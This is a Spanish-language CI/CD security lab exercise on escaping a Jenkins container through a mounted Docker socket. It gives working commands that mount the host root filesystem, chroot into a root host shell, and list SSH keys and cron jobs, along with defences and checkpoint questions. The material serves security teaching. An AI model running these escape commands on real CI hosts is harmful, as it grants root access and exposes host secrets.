# 11 - Escape por `docker.sock`

**Clase 3 · 20 min · M4 Jenkins + hardening**
**Fase:** escalada de privilegios / impacto en el host
**MITRE ATT&CK:** T1611 (Escape to Host), T1610 (Deploy Container)
**Riesgo OWASP CI/CD:** CICD-SEC-5 (control de acceso del pipeline), CICD-SEC-7 (configuracion insegura)

## Escenario

Tienes una shell en el contenedor de Jenkins (labs 04 o 10, o un step malicioso
en el pipeline). El contenedor monta `/var/run/docker.sock`. Ese socket es el
daemon de Docker del **host**: quien lo controla puede crear contenedores con
el filesystem del host montado. No es una vulnerabilidad de Docker; es una
decision de diseno del laboratorio, y un patron real muy comun
("docker-outside-of-docker").

Otra via documentada para llegar aqui es CVE-2026-33001: un archivo `.tar`
manipulado escribia fuera del workspace aprovechando symlinks. La entrada era un
artefacto; la salida, codigo colocado donde el controlador lo ejecutaba.

## Objetivo de aprendizaje

- Comprobar que la shell del CI tiene acceso al daemon del host.
- Montar `/` del host en un contenedor y leer un archivo fuera del contenedor.
- Entender por que esto es equivalente a root en el host.

## Antes de empezar

Necesitas una shell dentro de `lab-jenkins`. Si no la tienes, usa el lab 10.

```bash
docker exec -it lab-jenkins bash
```

**Que esperar:** un prompt `root@<id>:/#`. A partir de aqui todo ocurre dentro
del contenedor.

## Paso 1 - Confirmar el acceso al daemon

Dentro de Jenkins:

```bash
docker ps --format '{{.Names}}'
docker info --format '{{.ServerVersion}}'
```

**Que esperar:** los contenedores del lab (`lab-gitea`, `lab-registry`, ...) y
la version del daemon. Si ves `Cannot connect to the Docker daemon`, el socket
no esta montado y el lab no aplica.

**Por que es grave:** `docker ps` desde el contenedor ve los contenedores del
host, no los de un Docker interno. Confirmado el acceso, el resto es trivial.

## Paso 2 - Leer el filesystem del host

```bash
docker run --rm -v /:/host alpine cat /host/tmp/devops-lab-host-flag.txt
```

**Que esperar:** `FLAG{docker_sock_host_root}`

`-v /:/host` monta el root real del host dentro de un contenedor nuevo. No hace
falta `--privileged` ni capabilities extra.

## Paso 3 - Shell completa en el host (opcional)

```bash
docker run --rm -it -v /:/host alpine chroot /host /bin/sh
```

Dentro:

```bash
id
ls /root
cat /tmp/devops-lab-host-flag.txt
```

**Que demuestra:** un `chroot` al filesystem del host da una shell con los
usuarios, claves SSH, historial y cron del host. Es persistencia y movimiento
lateral en un solo paso.

## Paso 4 - Impacto medible

Dentro de la shell del host (o con otro `docker run`):

```bash
ls -la /root/.ssh 2>/dev/null
crontab -l 2>/dev/null | head
```

**Que demuestra:** el atacante no necesito un exploit del kernel: uso la API
del daemon. Cualquier secreto del host esta disponible, y puede crear un
contenedor persistente o modificar el arranque.

## Evidencia para el informe

- Salida de `docker ps` desde dentro de Jenkins (prueba de acceso al socket).
- Comando exacto con `-v /:/host` y el flag leido.
- Ruta del montaje en `docker-compose.yml` (linea del socket) y por que existe.
- Alcance: el host es la maquina del analista; en produccion seria el nodo de CI.

## Checkpoint

1. Por que montar el socket equivale a root en el host?
2. Que diferencia hay entre Docker-in-Docker y Docker-outside-of-Docker?
3. Que alternativa permite construir imagenes sin dar control del daemon?

## Defensa

- Nunca montar el socket; usar runners efimeros y aislados (DinD rootless o
  agentes en VMs).
- Si es imprescindible, un socket proxy (por ejemplo `docker-socket-proxy`) con
  solo los endpoints necesarios.
- Usuarios sin sudo, seccomp/AppArmor y el runner sin acceso al filesystem del
  host.
- Detectar `docker run -v / ...` y creacion de contenedores desde el CI.
- Separar el nodo de build del nodo de produccion.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| `Cannot connect to the Docker daemon` | el socket no esta montado; revisa `docker-compose.yml` |
| `alpine` no esta en cache y no hay red | `docker pull alpine` desde el host |
| El flag no existe | `./seed/bootstrap.sh` lo recrea (o `make ci`) |
| `chroot` falla | usa `--privileged` solo si el kernel lo exige; en el lab no deberia |
